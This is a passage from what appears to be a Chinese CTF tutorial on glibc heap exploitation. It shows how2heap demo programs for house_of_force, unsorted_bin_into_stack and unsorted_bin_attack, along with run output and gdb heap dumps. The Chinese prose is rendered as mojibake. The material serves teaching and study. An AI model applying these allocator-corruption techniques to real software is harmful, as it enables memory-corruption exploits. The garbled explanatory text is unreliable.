0x602020:    0x4141414141414141    0x00000000000001b1  &lt;-- chunk 2 [be freed] &lt;-- unsorted bin
0x602030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x00000000000001b0    0x0000000000000020  &lt;-- chunk 5 &lt;-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  &lt;-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602020, bk=0x602020
 â†’   Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE)
</code></pre>
<p>çŽ°åœ¨ unsorted bin é‡Œçš„ chunk çš„å¤§å°ä¸º 0x1b0ï¼Œå³ 0x90*3ã€‚å’¦ï¼Œæ‰€ä»¥ chunk 3 è™½ç„¶æ˜¯ä½¿ç”¨çŠ¶æ€ï¼Œä½†ä¹Ÿè¢«å¼ºè¡Œç®—åœ¨äº† free chunk çš„ç©ºé—´é‡Œäº†ã€‚</p>
<p>æœ€åŽï¼Œå¦‚æžœæˆ‘ä»¬åˆ†é…ä¸€å—å¤§å°ä¸º 0x1b0-0x10 çš„å¤§ç©ºé—´ï¼Œè¿”å›žçš„å †å—å³æ˜¯åŒ…æ‹¬äº† chunk 2 + chunk 3 + chunk 4 çš„å¤§ chunkã€‚è¿™æ—¶ chunk 6 å’Œ chunk 3 å°±é‡å äº†ï¼Œç»“æžœå°±åƒä¸Šé¢è¿è¡Œæ—¶æ‰“å°å‡ºæ¥çš„ä¸€æ ·ã€‚</p>
<h2 id="318-linux">3.1.8 Linux å †åˆ©ç”¨ï¼ˆä¸‹ï¼‰</h2>
<ul>
<li>how2heap</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#house_of_force">house_of_force</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#unsorted_bin_into_stack">unsorted_bin_into_stack</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#unsorted_bin_attack">unsorted_bin_attack</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#house_of_einherjar">house_of_einherjar</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#house_of_orange">house_of_orange</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.8_heap_exploit_3.html#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></li>
</ul>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/Others/3.1.6_heap_exploit">ä¸‹è½½æ–‡ä»¶</a></p>
<h2 id="how2heap_2">how2heap</h2>
<h3 id="house_of_force">house_of_force</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;

int main() {
    fprintf(stderr, &quot;We will overwrite a variable at %p\n\n&quot;, bss_var);

    intptr_t *p1 = malloc(0x10);
    int real_size = malloc_usable_size(p1);
    memset(p1, 'A', real_size);
    fprintf(stderr, &quot;Let's allocate the first chunk of 0x10 bytes: %p.\n&quot;, p1);
    fprintf(stderr, &quot;Real size of our allocated chunk is 0x%x.\n\n&quot;, real_size);

    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
    fprintf(stderr, &quot;Overwriting the top chunk size with a big value so the malloc will never call mmap.\n&quot;);
    fprintf(stderr, &quot;Old size of top chunk: %#llx\n&quot;, *((unsigned long long int *)ptr_top));
    ptr_top[0] = -1;
    fprintf(stderr, &quot;New size of top chunk: %#llx\n&quot;, *((unsigned long long int *)ptr_top));

    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
    fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size);
    int real_size_new = malloc_usable_size(new_ptr);
    memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);
    fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr);

    void* ctr_chunk = malloc(0x30);
    fprintf(stderr, &quot;malloc(0x30) =&gt; %p!\n&quot;, ctr_chunk);
    fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\n&quot;);

    fprintf(stderr, &quot;old string: %s\n&quot;, bss_var);
    strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
    fprintf(stderr, &quot;new string: %s\n&quot;, bss_var);
}
$ gcc -g house_of_force.c
$ ./a.out
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x824030
malloc(0x30) =&gt; 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
</code></pre>
<p>house_of_force æ˜¯ä¸€ç§é€šè¿‡æ”¹å†™ top chunk çš„ size å­—æ®µæ¥æ¬ºéª— malloc è¿”å›žä»»æ„åœ°å€çš„æŠ€æœ¯ã€‚æˆ‘ä»¬çŸ¥é“åœ¨ç©ºé—²å†…å­˜çš„æœ€é«˜å¤„ï¼Œå¿…ç„¶å­˜åœ¨ä¸€å—ç©ºé—²çš„ chunkï¼Œå³ top chunkï¼Œå½“ bins å’Œ fast bins éƒ½ä¸èƒ½æ»¡è¶³åˆ†é…éœ€è¦çš„æ—¶å€™ï¼Œmalloc ä¼šä»Ž top chunk ä¸­åˆ†å‡ºä¸€å—å†…å­˜ç»™ç”¨æˆ·ã€‚æ‰€ä»¥ top chunk çš„å¤§å°ä¼šéšç€åˆ†é…å’Œå›žæ”¶ä¸åœåœ°å˜åŒ–ã€‚è¿™ç§æ”»å‡»å‡è®¾æœ‰ä¸€ä¸ªæº¢å‡ºæ¼æ´žï¼Œå¯ä»¥æ”¹å†™ top chunk çš„å¤´éƒ¨ï¼Œç„¶åŽå°†å…¶æ”¹ä¸ºä¸€ä¸ªéžå¸¸å¤§çš„å€¼ï¼Œä»¥ç¡®ä¿æ‰€æœ‰çš„ malloc å°†ä½¿ç”¨ top chunk åˆ†é…ï¼Œè€Œä¸ä¼šè°ƒç”¨ mmapã€‚è¿™æ—¶å¦‚æžœæ”»å‡»è€… malloc ä¸€ä¸ªå¾ˆå¤§çš„æ•°ç›®ï¼ˆè´Ÿæœ‰ç¬¦å·æ•´æ•°ï¼‰ï¼Œtop chunk çš„ä½ç½®åŠ ä¸Šè¿™ä¸ªå¤§æ•°ï¼Œé€ æˆæ•´æ•°æº¢å‡ºï¼Œç»“æžœæ˜¯ top chunk èƒ½å¤Ÿè¢«è½¬ç§»åˆ°å †ä¹‹å‰çš„å†…å­˜åœ°å€ï¼ˆå¦‚ç¨‹åºçš„ .bss æ®µã€.data æ®µã€GOT è¡¨ç­‰ï¼‰ï¼Œä¸‹æ¬¡å†æ‰§è¡Œ malloc æ—¶ï¼Œæ”»å‡»è€…å°±èƒ½å¤ŸæŽ§åˆ¶è½¬ç§»ä¹‹åŽåœ°å€å¤„çš„å†…å­˜ã€‚</p>
<p>é¦–å…ˆéšæ„åˆ†é…ä¸€ä¸ª chunkï¼Œæ­¤æ—¶å†…å­˜é‡Œå­˜åœ¨ä¸¤ä¸ª chunkï¼Œå³ chunk 1 å’Œ top chunkï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000020fe1  &lt;-- top chunk
0x602030:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>chunk 1 çœŸå®žå¯ç”¨çš„å†…å­˜æœ‰ 0x18 å­—èŠ‚ã€‚</p>
<p>å‡è®¾ chunk 1 å­˜åœ¨æº¢å‡ºï¼Œåˆ©ç”¨è¯¥æ¼æ´žæˆ‘ä»¬çŽ°åœ¨å°† top chunk çš„ size å€¼æ”¹ä¸ºä¸€ä¸ªéžå¸¸å¤§çš„æ•°ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xffffffffffffffff  &lt;-- modified top chunk
0x602030:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>æ”¹å†™ä¹‹åŽçš„ size==0xffffffffã€‚</p>
<p>çŽ°åœ¨æˆ‘ä»¬å¯ä»¥ malloc ä¸€ä¸ªä»»æ„å¤§å°çš„å†…å­˜è€Œä¸ç”¨è°ƒç”¨ mmap äº†ã€‚æŽ¥ä¸‹æ¥ malloc ä¸€ä¸ª chunkï¼Œä½¿å¾—è¯¥ chunk åˆšå¥½åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦æŽ§åˆ¶çš„é‚£å—åŒºåŸŸä¸ºæ­¢ï¼Œè¿™æ ·åœ¨ä¸‹ä¸€æ¬¡ malloc æ—¶ï¼Œå°±å¯ä»¥è¿”å›žåˆ°æˆ‘ä»¬æƒ³è¦æŽ§åˆ¶çš„åŒºåŸŸäº†ã€‚è®¡ç®—æ–¹æ³•æ˜¯ç”¨ç›®æ ‡åœ°å€å‡åŽ» top chunk åœ°å€ï¼Œå†å‡åŽ» chunk å¤´çš„å¤§å°ã€‚</p>
<pre><code class="language-text">gefâž¤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xfffffffffffff051
0x602030:    0x0000000000000000    0x0000000000000000
gefâž¤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000fa9  &lt;-- top chunk
0x601080 &lt;bss_var&gt;:    0x2073692073696854    0x676e697274732061  &lt;-- target
0x601090 &lt;bss_var+16&gt;:    0x6577207461687420    0x6f7420746e617720
0x6010a0 &lt;bss_var+32&gt;:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>å†æ¬¡ mallocï¼Œå°†ç›®æ ‡åœ°å€åŒ…å«è¿›æ¥å³å¯ï¼ŒçŽ°åœ¨æˆ‘ä»¬å°±æˆåŠŸæŽ§åˆ¶äº†ç›®æ ‡å†…å­˜ï¼š</p>
<pre><code class="language-text">gefâž¤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000041  &lt;-- chunk 2
0x601080 &lt;bss_var&gt;:    0x2073692073696854    0x676e697274732061  &lt;-- target
0x601090 &lt;bss_var+16&gt;:    0x6577207461687420    0x6f7420746e617720
0x6010a0 &lt;bss_var+32&gt;:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000f69  &lt;-- top chunk
</code></pre>
<p>è¯¥æŠ€æœ¯çš„ç¼ºç‚¹æ˜¯ä¼šå—åˆ° ASLR çš„å½±å“ï¼Œå› ä¸ºå¦‚æžœæ”»å‡»è€…éœ€è¦ä¿®æ”¹æŒ‡å®šä½ç½®çš„å†…å­˜ï¼Œä»–é¦–å…ˆéœ€è¦çŸ¥é“å½“å‰ top chunk çš„ä½ç½®ä»¥æž„é€ åˆé€‚çš„ malloc å¤§å°æ¥è½¬ç§» top chunkã€‚è€Œ ASLR å°†ä½¿å †å†…å­˜åœ°å€éšæœºï¼Œæ‰€ä»¥è¯¥æŠ€æœ¯è¿˜éœ€åŒæ—¶é…åˆä½¿ç”¨ä¿¡æ¯æ³„æ¼ä»¥è¾¾æˆæ”»å‡»ã€‚</p>
<h3 id="unsorted_bin_into_stack">unsorted_bin_into_stack</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    unsigned long stack_buf[4] = {0};

    unsigned long *victim  = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, &quot;Allocating the victim chunk at %p\n&quot;, victim);

    // deal with tcache
    // int *k[10], i;
    // for (i = 0; i &lt; 7; i++) {
    //     k[i] = malloc(0x80);
    // }
    // for (i = 0; i &lt; 7; i++) {
    //     free(k[i]);
    // }

    free(victim);
    fprintf(stderr, &quot;Freeing the chunk, it will be inserted in the unsorted bin\n\n&quot;);

    stack_buf[1] = 0x100 + 0x10;
    stack_buf[3] = (unsigned long)stack_buf;        // or any other writable address
    fprintf(stderr, &quot;Create a fake chunk on the stack\n&quot;);
    fprintf(stderr, &quot;fake-&gt;size: %p\n&quot;, (void *)stack_buf[1]);
    fprintf(stderr, &quot;fake-&gt;bk: %p\n\n&quot;, (void *)stack_buf[3]);

    victim[1] = (unsigned long)stack_buf;
    fprintf(stderr, &quot;Now we overwrite the victim-&gt;bk pointer to stack: %p\n\n&quot;, stack_buf);

    fprintf(stderr, &quot;Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\n&quot;, &amp;stack_buf[2]);

    unsigned long *fake = malloc(0x100);
    fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, fake);
}
$ gcc -g unsorted_bin_into_stack.c
$ ./a.out
Allocating the victim chunk at 0x17a1010
Freeing the chunk, it will be inserted in the unsorted bin

Create a fake chunk on the stack
fake-&gt;size: 0x110
fake-&gt;bk: 0x7fffcd906480

Now we overwrite the victim-&gt;bk pointer to stack: 0x7fffcd906480

Malloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490
malloc(0x100): 0x7fffcd906490
</code></pre>
<p>unsorted-bin-into-stack é€šè¿‡æ”¹å†™ unsorted bin é‡Œ chunk çš„ bk æŒ‡é’ˆåˆ°ä»»æ„åœ°å€ï¼Œä»Žè€Œåœ¨æ ˆä¸Š malloc å‡º chunkã€‚</p>
<p>é¦–å…ˆå°†ä¸€ä¸ª chunk æ”¾å…¥ unsorted binï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šä¼ªé€ ä¸€ä¸ª chunkï¼š</p>
<pre><code class="language-text">gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk
0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx stack_buf
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk
0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
</code></pre>
<p>ç„¶åŽå‡è®¾æœ‰ä¸€ä¸ªæ¼æ´žï¼Œå¯ä»¥æ”¹å†™ victim chunk çš„ bk æŒ‡é’ˆï¼Œé‚£ä¹ˆå°†å…¶æ”¹ä¸ºæŒ‡å‘ fake chunkï¼š</p>
<pre><code class="language-text">gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk
0x602010:    0x00007ffff7dd1b78    0x00007fffffffdbc0    &lt;-- bk pointer
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx stack_buf
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk
0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0
</code></pre>
<p>é‚£ä¹ˆæ­¤æ—¶å°±ç›¸å½“äºŽ fake chunk å·²ç»è¢«é“¾æŽ¥åˆ° unsorted bin ä¸­ã€‚åœ¨ä¸‹ä¸€æ¬¡ malloc çš„æ—¶å€™ï¼Œmalloc ä¼šé¡ºç€ bk æŒ‡é’ˆè¿›è¡ŒéåŽ†ï¼ŒäºŽæ˜¯å°±æ‰¾åˆ°äº†å¤§å°æ­£å¥½åˆé€‚çš„ fake chunkï¼š</p>
<pre><code class="language-text">gdb-peda$ x/6gx victim - 2
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk
0x602010:    0x00007ffff7dd1bf8    0x00007ffff7dd1bf8
0x602020:    0x0000000000000000    0x0000000000000000
gdb-peda$ x/4gx fake - 2
0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk
0x7fffffffdbd0:    0x00007ffff7dd1b78    0x00007fffffffdbc0
</code></pre>
<p>fake chunk è¢«å–å‡ºï¼Œè€Œ victim chunk è¢«ä»Ž unsorted bin ä¸­å–å‡ºæ¥æ”¾åˆ°äº† small bin ä¸­ã€‚å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ fake chunk çš„ fd æŒ‡é’ˆè¢«ä¿®æ”¹äº†ï¼Œè¿™æ˜¯ unsorted bin çš„åœ°å€ï¼Œé€šè¿‡å®ƒå¯ä»¥æ³„éœ² libc åœ°å€ï¼Œè¿™æ­£æ˜¯ä¸‹é¢ unsorted bin attack ä¼šè®²åˆ°çš„ã€‚</p>
<p>å°†ä¸Šé¢çš„ä»£ç è§£é™¤æ³¨é‡Šï¼Œå°±æ˜¯ libc-2.27 çŽ¯å¢ƒä¸‹çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ç”±äºŽ tcache çš„å½±å“ï¼Œ<code>stack_buf[3]</code> ä¸èƒ½å†è®¾ç½®æˆä»»æ„åœ°å€ã€‚</p>
<p>malloc å‰ï¼š</p>
<pre><code class="language-text">gdb-peda$ x/6gx victim - 2
0x555555756250: 0x0000000000000000      0x0000000000000091  &lt;-- victim chunk
0x555555756260: 0x00007ffff7dd2b00      0x00007fffffffdcb0
0x555555756270: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/4gx stack_buf
0x7fffffffdcb0: 0x0000000000000000      0x0000000000000110  &lt;-- fake chunk
0x7fffffffdcc0: 0x0000000000000000      0x00007fffffffdcb0
gdb-peda$ x/26gx 0x0000555555756000+0x10
0x555555756010: 0x0700000000000000      0x0000000000000000  &lt;-- counts
0x555555756020: 0x0000000000000000      0x0000000000000000
0x555555756030: 0x0000000000000000      0x0000000000000000
0x555555756040: 0x0000000000000000      0x0000000000000000
0x555555756050: 0x0000000000000000      0x0000000000000000
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000000000000000      0x0000555555756670  &lt;-- entries
0x555555756090: 0x0000000000000000      0x0000000000000000
0x5555557560a0: 0x0000000000000000      0x0000000000000000
0x5555557560b0: 0x0000000000000000      0x0000000000000000
0x5555557560c0: 0x0000000000000000      0x0000000000000000
0x5555557560d0: 0x0000000000000000      0x0000000000000000
</code></pre>
<p>malloc åŽï¼š</p>
<pre><code class="language-text">gdb-peda$ x/6gx victim - 2
0x555555756250: 0x0000000000000000      0x0000000000000091  &lt;-- victim chunk
0x555555756260: 0x00007ffff7dd2b80      0x00007ffff7dd2b80
0x555555756270: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/4gx fake - 2
0x7fffffffdcb0: 0x0000000000000000      0x0000000000000110  &lt;-- fake chunk
0x7fffffffdcc0: 0x00007ffff7dd2b00      0x00007fffffffdcb0
gdb-peda$ x/26gx 0x0000555555756000+0x10
0x555555756010: 0x0700000000000000      0x0700000000000000  &lt;-- counts  &lt;-- counts
0x555555756020: 0x0000000000000000      0x0000000000000000
0x555555756030: 0x0000000000000000      0x0000000000000000
0x555555756040: 0x0000000000000000      0x0000000000000000
0x555555756050: 0x0000000000000000      0x0000000000000000
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000000000000000      0x0000555555756670  &lt;-- entries
0x555555756090: 0x0000000000000000      0x0000000000000000
0x5555557560a0: 0x0000000000000000      0x0000000000000000
0x5555557560b0: 0x0000000000000000      0x0000000000000000
0x5555557560c0: 0x0000000000000000      0x00007fffffffdcc0  &lt;-- entries
0x5555557560d0: 0x0000000000000000      0x0000000000000000
</code></pre>
<p>å¯ä»¥çœ‹åˆ°åœ¨ malloc æ—¶ï¼Œfake chunk è¢«ä¸æ–­é‡å¤åœ°é“¾æŽ¥åˆ° tcache binï¼Œç›´åˆ°è£…æ»¡åŽï¼Œæ‰ä»Ž unsorted bin é‡Œå–å‡ºã€‚åŒæ ·çš„ï¼Œfake chunk çš„ fd æŒ‡å‘ unsorted binã€‚</p>
<h3 id="unsorted_bin_attack">unsorted_bin_attack</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, &quot;The target we want to rewrite on stack: %p -&gt; %ld\n\n&quot;, &amp;stack_var, stack_var);

    unsigned long *p  = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, &quot;Now, we allocate first small chunk on the heap at: %p\n&quot;,p);

    free(p);
    fprintf(stderr, &quot;We free the first chunk now. Its bk pointer point to %p\n&quot;, (void*)p[1]);

    p[1] = (unsigned long)(&amp;stack_var - 2);
    fprintf(stderr, &quot;We write it with the target address-0x10: %p\n\n&quot;, (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, &quot;Let's malloc again to get the chunk we just free: %p -&gt; %p\n&quot;, &amp;stack_var, (void*)stack_var);
}
$ gcc -g unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -&gt; 0

Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
We write it with the target address-0x10: 0x7ffc9b1d61a0

Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -&gt; 0x7f2404cf5b78
</code></pre>
<p>unsorted bin æ”»å‡»é€šå¸¸æ˜¯ä¸ºæ›´è¿›ä¸€æ­¥çš„æ”»å‡»åšå‡†å¤‡çš„ï¼Œæˆ‘ä»¬çŸ¥é“ unsorted bin æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œåœ¨åˆ†é…æ—¶ä¼šé€šè¿‡ unlink æ“ä½œå°† chunk ä»Žé“¾è¡¨ä¸­ç§»é™¤ï¼Œæ‰€ä»¥å¦‚æžœèƒ½å¤ŸæŽ§åˆ¶ unsorted bin chunk çš„ bk æŒ‡é’ˆï¼Œå°±å¯ä»¥å‘ä»»æ„ä½ç½®å†™å…¥ä¸€ä¸ªæŒ‡é’ˆã€‚è¿™é‡Œé€šè¿‡ unlink å°† libc çš„ä¿¡æ¯å†™å…¥åˆ°æˆ‘ä»¬å¯æŽ§çš„å†…å­˜ä¸­ï¼Œä»Žè€Œå¯¼è‡´ä¿¡æ¯æ³„æ¼ï¼Œä¸ºè¿›ä¸€æ­¥çš„æ”»å‡»æä¾›ä¾¿åˆ©ã€‚</p>
<p>unlink çš„å¯¹ unsorted bin çš„æ“ä½œæ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-c">          /* remove from unsorted list */
          unsorted_chunks (av)-&gt;bk = bck;
          bck-&gt;fd = unsorted_chunks (av);
</code></pre>
<p>å…¶ä¸­ <code>bck = victim-&gt;bk</code>ã€‚</p>
<p>é¦–å…ˆåˆ†é…ä¸¤ä¸ª chunkï¼Œç„¶åŽé‡Šæ”¾æŽ‰ç¬¬ä¸€ä¸ªï¼Œå®ƒå°†è¢«åŠ å…¥åˆ° unsorted bin ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1 [be freed]
0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gefâž¤  x/4gx &amp;stack_var-2
0x7fffffffdc50:    0x00007fffffffdd60    0x0000000000400712
0x7fffffffdc60:    0x0000000000000000    0x0000000000602010
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 â†’   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
</code></pre>
<p>ç„¶åŽå‡è®¾å­˜åœ¨ä¸€ä¸ªæº¢å‡ºæ¼æ´žï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ chunk 1 çš„æ•°æ®ã€‚ç„¶åŽæˆ‘ä»¬å°† chunk 1 çš„ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å‘ç›®æ ‡åœ°å€ - 2ï¼Œä¹Ÿå°±ç›¸å½“äºŽæ˜¯åœ¨ç›®æ ‡åœ°å€å¤„æœ‰ä¸€ä¸ª fake free chunkï¼Œç„¶åŽ mallocï¼š</p>
<pre><code class="language-text">gefâž¤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 3
0x602010:    0x00007ffff7dd1b78    0x00007fffffffdc50
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000021  &lt;-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gefâž¤  x/4gx &amp;stack_var-2
0x7fffffffdc50:    0x00007fffffffdc80    0x0000000000400756  &lt;-- fake chunk
0x7fffffffdc60:    0x00007ffff7dd1b78    0x0000000000602010      &lt;-- fd-&gt;TAIL
</code></pre>
<p>ä»Žè€Œæ³„æ¼äº† unsorted bin çš„å¤´éƒ¨åœ°å€ã€‚</p>
<p>é‚£ä¹ˆç»§ç»­æ¥çœ‹ libc-2.27 é‡Œæ€Žä¹ˆå¤„ç†ï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, &quot;The target we want to rewrite on stack: %p -&gt; %ld\n\n&quot;, &amp;stack_var, stack_var);

    unsigned long *p = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, &quot;Now, we allocate first small chunk on the heap at: %p\n&quot;,p);

    free(p);
    fprintf(stderr, &quot;Freed the first chunk to put it in a tcache bin\n&quot;);

    p[0] = (unsigned long)(&amp;stack_var);
    fprintf(stderr, &quot;Overwrite the next ptr with the target address\n&quot;);
    malloc(0x80);
    malloc(0x80);
    fprintf(stderr, &quot;Now we malloc twice to make tcache struct's counts '0xff'\n\n&quot;);

    free(p);
    fprintf(stderr, &quot;Now free again to put it in unsorted bin\n&quot;);
    p[1] = (unsigned long)(&amp;stack_var - 2);
    fprintf(stderr, &quot;Now write its bk ptr with the target address-0x10: %p\n\n&quot;, (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, &quot;Finally malloc again to get the chunk at target address: %p -&gt; %p\n&quot;, &amp;stack_var, (void*)stack_var);
}
$ gcc -g tcache_unsorted_bin_attack.c
